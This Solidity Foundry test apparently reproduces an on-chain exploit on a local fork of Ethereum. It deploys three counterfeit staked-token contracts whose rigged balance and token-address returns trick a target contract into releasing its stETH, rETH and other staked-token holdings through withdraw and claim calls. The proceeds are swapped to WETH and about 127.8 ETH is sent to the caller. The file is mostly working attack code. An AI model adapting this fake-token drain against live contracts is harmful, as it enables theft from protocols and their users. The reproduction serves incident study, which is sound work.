// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60
// https://etherscan.io/address/0x792eC27874E1F614e757A1ae49d00ef5B2C73959

struct S1 {
    address p1;
    address p2;
    uint24 p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    uint160 p8;
}

interface I {
    function balanceOf(address) external payable returns (uint256);
    function withdraw(uint256) external payable;
    function claim(uint256) external payable;
    function withdrawalRequestsByUserLength(address) external payable;
    function approve(address, uint256) external payable;
    function mint(address, uint256) external payable;
    function withdraw(address, uint256) external payable;
    function exactInputSingle(S1 memory) external payable;
    function exchange(int128, int128, uint256, uint256) external payable;
}

contract Xb2e8 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60");
    }

    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xae78 = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address constant xae7a = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant xbaa8 = 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70;
    address constant xbe98 = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xdc24 = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address constant xe592 = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address x09f2;
    address xe26d;
    address x18d0;

    function test() public {
        // vm.startPrank(0x792eC27874E1F614e757A1ae49d00ef5B2C73959, 0x792eC27874E1F614e757A1ae49d00ef5B2C73959);

        vm.createSelectFork("http://localhost:18545", 18448167); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60));

        // https://explorer.phalcon.xyz/tx/eth/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60
        x8af9b5fb();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 18448167); // tx.blockNumber - 1

        vm.warp(1698489695);
        vm.roll(18448168);
        // https://explorer.phalcon.xyz/tx/eth/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60
        x8af9b5fb();
    }

    function x8af9b5fb() public {
        _constructor_();
    }

    function call() public payable {}

    function _constructor_() public {
        x09f2 = address(new X09f2());
        x18d0 = address(new X18d0());
        xe26d = address(new Xe26d());
        I(x09f2).mint(r, 10000000000000000000000);
        I(x18d0).mint(r, 10000000000000000000000);
        I(xe26d).mint(r, 10000000000000000000000);
        I(x09f2).approve(xbaa8, type(uint256).max);
        I(x18d0).approve(xbaa8, type(uint256).max);
        I(xe26d).approve(xbaa8, type(uint256).max);
        // uint256 v1 = 64176037513415148812;
        uint256 v1 = I(xae7a).balanceOf(xbaa8);
        console2.log("I(xae7a).balanceOf(xbaa8)\t->", "64176037513415148812 (64.1760 ether)");
        I(xbaa8).withdraw(x09f2, v1);
        I(xbaa8).withdrawalRequestsByUserLength(r);
        I(xbaa8).claim(0);
        // uint256 v2 = 39165842900855519099;
        uint256 v2 = I(xae78).balanceOf(xbaa8);
        console2.log("I(xae78).balanceOf(xbaa8)\t->", "39165842900855519099 (39.1658 ether)");
        I(xbaa8).withdraw(x18d0, v2);
        I(xbaa8).withdrawalRequestsByUserLength(r);
        I(xbaa8).claim(1);
        // uint256 v3 = 20000407064566313222;
        uint256 v3 = I(xbe98).balanceOf(xbaa8);
        console2.log("I(xbe98).balanceOf(xbaa8)\t->", "20000407064566313222 (20.4070 ether)");
        I(xbaa8).withdraw(xe26d, v3);
        I(xbaa8).withdrawalRequestsByUserLength(r);
        I(xbaa8).claim(2);
        // uint256 v4 = 64176037513415148811;
        uint256 v4 = I(xae7a).balanceOf(r);
        console2.log("I(xae7a).balanceOf(r)\t\t->", "64176037513415148811 (64.1760 ether)");
        // uint256 v5 = 39165842900855519099;
        uint256 v5 = I(xae78).balanceOf(r);
        console2.log("I(xae78).balanceOf(r)\t\t->", "39165842900855519099 (39.1658 ether)");
        // uint256 v6 = 20000407064566313222;
        uint256 v6 = I(xbe98).balanceOf(r);
        console2.log("I(xbe98).balanceOf(r)\t\t->", "20000407064566313222 (20.4070 ether)");
        I(xae7a).approve(xdc24, v4);
        I(xdc24).exchange(1, 0, v4, 0);
        I(xae78).approve(xe592, v5);

        S1 memory s101 = S1(xae78, xc02a, 500, r, 1698489695, 39165842900855519099, 0, 0);
        I(xe592).exactInputSingle(s101);

        I(xbe98).approve(xe592, v6);

        S1 memory s102 = S1(xbe98, xc02a, 500, r, 1698489695, 20000407064566313222, 0, 0);
        I(xe592).exactInputSingle(s102);

        {
            // uint256 v7 = 63638748240147758427;
            uint256 v7 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "63638748240147758427 (63.6387 ether)");
            I(xc02a).withdraw(v7);
            address(tx.origin).call{value: 127797499079942863577}("");
        }

        bytes memory rt =
            hex"608060405236600a57005b600080fdfea2646970667358221220a60cab4ba371ba7ad5ee20664d2541e70faf7fc3d93384bb3d41501f5c5a3d6564736f6c63430008150033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X09f2 {
    address immutable r = address(this);
    receive() external payable {}

    uint256 t_scaledBalanceOf = 0;

    constructor() payable {}

    function mint(address, uint256) public {}

    function approve(address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function balanceOf(address) public returns (uint256) {
        return 10000000000000000000000;
    }

    function scaledBalanceOf(address) public {
        t_scaledBalanceOf++;

        if (t_scaledBalanceOf == 1) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_scaledBalanceOf == 2) {
            bytes memory rt = hex"000000ee0aca8b2f8b7e78f0a80b29870e23f3d1d4324d7a74b0000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function stakedTokenAddress() public {
        bytes memory rt = abi.encodePacked(abi.encode(address(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function burn(address, uint256) public {}

    function allowance(address, address) public returns (uint256) {
        return type(uint256).max;
    }

    function transferFrom(address, address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function scaledBalanceToBalance(uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000037a9f16196740c50c";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X18d0 {
    address immutable r = address(this);
    receive() external payable {}

    uint256 t_scaledBalanceOf = 0;

    constructor() payable {}

    function approve(address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function allowance(address, address) public returns (uint256) {
        return type(uint256).max;
    }

    function scaledBalanceOf(address) public {
        t_scaledBalanceOf++;

        if (t_scaledBalanceOf == 1) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_scaledBalanceOf == 2) {
            bytes memory rt = hex"000000914631036c5f81dcf12f860840361b1e2bdc9530d3a30c000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function mint(address, uint256) public {}

    function balanceOf(address) public returns (uint256) {
        return 10000000000000000000000;
    }

    function scaledBalanceToBalance(uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000021f89069bda3f777b";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function burn(address, uint256) public {}

    function transferFrom(address, address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function stakedTokenAddress() public {
        bytes memory rt = abi.encodePacked(abi.encode(address(0xae78736Cd615f374D3085123A210448E74Fc6393)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xe26d {
    address immutable r = address(this);
    receive() external payable {}

    uint256 t_scaledBalanceOf = 0;

    constructor() payable {}

    function allowance(address, address) public returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function mint(address, uint256) public {}

    function stakedTokenAddress() public {
        bytes memory rt = abi.encodePacked(abi.encode(address(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function burn(address, uint256) public {}

    function scaledBalanceOf(address) public {
        t_scaledBalanceOf++;

        if (t_scaledBalanceOf == 1) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_scaledBalanceOf == 2) {
            bytes memory rt = hex"0000004a2f85a3432b62e4b2295dfe3db4f1c43440107a6a6458000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function scaledBalanceToBalance(uint256) public {
        bytes memory rt = hex"000000000000000000000000000000000000000000000001158fb8422eb03106";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function balanceOf(address) public returns (uint256) {
        return 10000000000000000000000;
    }

    function transferFrom(address, address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
